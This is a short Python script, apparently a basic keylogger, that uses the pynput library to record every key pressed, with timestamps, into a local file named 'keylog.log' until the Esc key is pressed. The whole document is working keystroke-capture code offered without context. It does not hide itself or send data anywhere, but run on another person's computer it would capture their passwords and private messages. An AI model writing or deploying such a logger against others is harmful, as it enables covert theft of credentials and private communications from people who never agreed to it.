from pynput import keyboard
import logging

log_file = "keylog.log"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s : %(message)s')

def on_press(key):
    try: 
        logging.info('Key {0} pressed'.format(key.char))
    except:
        logging.info('special key {0} pressed'.format(key))
        
def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

